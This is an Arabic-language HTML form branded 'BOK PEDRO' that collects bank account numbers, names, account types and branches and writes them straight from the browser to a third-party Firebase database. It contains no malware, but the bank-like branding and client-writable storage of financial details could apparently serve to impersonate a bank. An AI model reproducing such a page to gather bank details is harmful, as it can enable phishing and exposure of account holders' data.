<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#07110e">
  <title>BOK PEDRO | إضافة مستفيد</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: #f5fff9;
      background:
        radial-gradient(ellipse at top, #123c2b 0%, transparent 55%),
        #07110e;
      padding: 25px 16px;
    }

    .container {
      max-width: 470px;
      margin: 25px auto;
    }

    .brand {
      text-align: center;
      margin-bottom: 28px;
    }

    .logo {
      width: 65px;
      height: 65px;
      margin: auto auto 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 1px solid #3b8060;
      background: linear-gradient(145deg, #194e37, #0a2017);
      font-size: 25px;
      font-weight: 900;
      letter-spacing: -2px;
      color: #a7f3c7;
      border-radius: 20px;
    }

    h1 {
      font-size: 25px;
      margin: 0 0 9px;
      letter-spacing: 1px;
    }

    .subtitle {
      font-size: 13px;
      color: #9db6a8;
      line-height: 1.8;
    }

    .card {
      background: rgba(19, 34, 27, 0.94);
      border: 1px solid #294739;
      border-radius: 22px;
      padding: 23px 19px;
      box-shadow: 0 20px 60px #0005;
    }

    .card h2 {
      font-size: 19px;
      margin: 0 0 7px;
    }

    .description {
      color: #9eb6a8;
      font-size: 12px;
      line-height: 1.8;
      margin-bottom: 23px;
    }

    label {
      display: block;
      margin: 17px 0 8px;
      font-size: 13px;
      color: #d9eee2;
    }

    input, select {
      width: 100%;
      min-height: 49px;
      padding: 13px;
      border: 1px solid #345443;
      border-radius: 12px;
      background: #0b1912;
      color: #fff;
      outline: none;
      font-size: 14px;
      font-family: inherit;
    }

    input:focus, select:focus {
      border-color: #61d99a;
      box-shadow: 0 0 0 3px #61d99a18;
    }

    input::placeholder {
      color: #6d8979;
    }

    .ltr {
      direction: ltr;
      text-align: left;
    }

    button {
      width: 100%;
      min-height: 51px;
      margin-top: 24px;
      border: 0;
      border-radius: 13px;
      background: linear-gradient(100deg, #36b878, #15945a);
      color: #04140b;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: .6;
      cursor: wait;
    }

    .notice {
      display: none;
      margin-top: 17px;
      padding: 13px;
      border-radius: 11px;
      font-size: 13px;
      line-height: 1.8;
    }

    .notice.success {
      display: block;
      color: #a7f3c7;
      background: #123b27;
      border: 1px solid #286c47;
    }

    .notice.error {
      display: block;
      color: #ffc0c0;
      background: #401d20;
      border: 1px solid #77383d;
    }

    .footer {
      text-align: center;
      color: #6f8c7b;
      font-size: 11px;
      margin-top: 24px;
    }

    .security {
      color: #93b7a1;
      font-size: 11px;
      line-height: 1.8;
      margin-top: 16px;
    }
  </style>
</head>

<body>
  <main class="container">

    <header class="brand">
      <div class="logo">BOK</div>
      <h1>BOK PEDRO</h1>
      <div class="subtitle">
        بوابة إضافة بيانات المستفيدين<br>
        Beneficiary Registration Portal
      </div>
    </header>

    <section class="card">
      <h2>إضافة مستفيد جديد</h2>

      <div class="description">
        أدخل بيانات المستفيد بدقة. ستُرسل البيانات للمراجعة قبل اعتمادها.
      </div>

      <form id="beneficiaryForm">

        <label for="accountNumber">رقم الحساب — 7 أرقام</label>
        <input
          id="accountNumber"
          class="ltr"
          type="text"
          inputmode="numeric"
          maxlength="7"
          pattern="[0-9]{7}"
          placeholder="1234567"
          required
        >

        <label for="accountNumber16">رقم الحساب الكامل — 16 رقماً</label>
        <input
          id="accountNumber16"
          class="ltr"
          type="text"
          inputmode="numeric"
          maxlength="16"
          pattern="[0-9]{16}"
          placeholder="0123456789012345"
          required
        >

        <label for="name">اسم المستفيد</label>
        <input
          id="name"
          type="text"
          maxlength="120"
          placeholder="الاسم الكامل"
          required
        >

        <label for="accountType">نوع الحساب</label>
        <select id="accountType" required>
          <option value="">اختر نوع الحساب</option>
          <option value="حساب جاري">حساب جاري</option>
          <option value="حساب توفير">حساب توفير</option>
          <option value="حساب آخر">حساب آخر</option>
        </select>

        <label for="branch">الفرع</label>
        <input
          id="branch"
          type="text"
          maxlength="100"
          placeholder="اسم الفرع"
          required
        >

        <button id="submitButton" type="submit">
          إرسال البيانات للمراجعة
        </button>

        <div id="notice" class="notice" role="status"></div>
      </form>

      <div class="security">
        تنبيه: لا تدخل كلمة مرور أو رقم PIN أو رمز تحقق أو بيانات بطاقة مصرفية.
      </div>
    </section>

    <footer class="footer">
      BOK PEDRO · Beneficiary Services
    </footer>

  </main>

  <script type="module">
    import { initializeApp }
      from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";

    import {
      getDatabase,
      ref,
      push,
      set,
      serverTimestamp
    } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDnvmRTgZl1p325V3TmCjIH-PnPfjJPPpk",
      authDomain: "bok-ped.firebaseapp.com",
      databaseURL: "https://bok-ped-default-rtdb.firebaseio.com",
      projectId: "bok-ped",
      storageBucket: "bok-ped.firebasestorage.app",
      messagingSenderId: "812838230843",
      appId: "1:812838230843:web:f3bd5f59343db42b52b51e",
      measurementId: "G-26SMZR0QCC"
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    const form = document.getElementById("beneficiaryForm");
    const button = document.getElementById("submitButton");
    const notice = document.getElementById("notice");

    function showMessage(message, type) {
      notice.className = "notice " + type;
      notice.textContent = message;
    }

    form.addEventListener("submit", async function(event) {
      event.preventDefault();

      const accountNumber =
        document.getElementById("accountNumber").value.trim();

      const accountNumber16 =
        document.getElementById("accountNumber16").value.trim();

      const name =
        document.getElementById("name").value.trim();

      const accountType =
        document.getElementById("accountType").value;

      const branch =
        document.getElementById("branch").value.trim();

      if (!/^[0-9]{7}$/.test(accountNumber)) {
        showMessage("رقم الحساب يجب أن يتكون من 7 أرقام.", "error");
        return;
      }

      if (!/^[0-9]{16}$/.test(accountNumber16)) {
        showMessage("رقم الحساب الكامل يجب أن يتكون من 16 رقماً.", "error");
        return;
      }

      if (!name || !accountType || !branch) {
        showMessage("يرجى إكمال جميع الحقول.", "error");
        return;
      }

      button.disabled = true;
      button.textContent = "جارٍ إرسال البيانات...";

      try {
        const newRequest = push(ref(database, "beneficiaryRequests"));

        await set(newRequest, {
          accountNumber: accountNumber,
          accountNumber16: accountNumber16,
          name: name,
          accountType: accountType,
          branch: branch,
          status: "pending",
          createdAt: serverTimestamp()
        });

        showMessage(
          "تم إرسال البيانات بنجاح، وهي بانتظار المراجعة والاعتماد.",
          "success"
        );

        form.reset();

      } catch (error) {
        console.error(error);

        showMessage(
          "تعذر إرسال البيانات. تأكد من اتصال الإنترنت وصلاحيات Firebase.",
          "error"
        );
      } finally {
        button.disabled = false;
        button.textContent = "إرسال البيانات للمراجعة";
      }
    });
  </script>
</body>
</html>
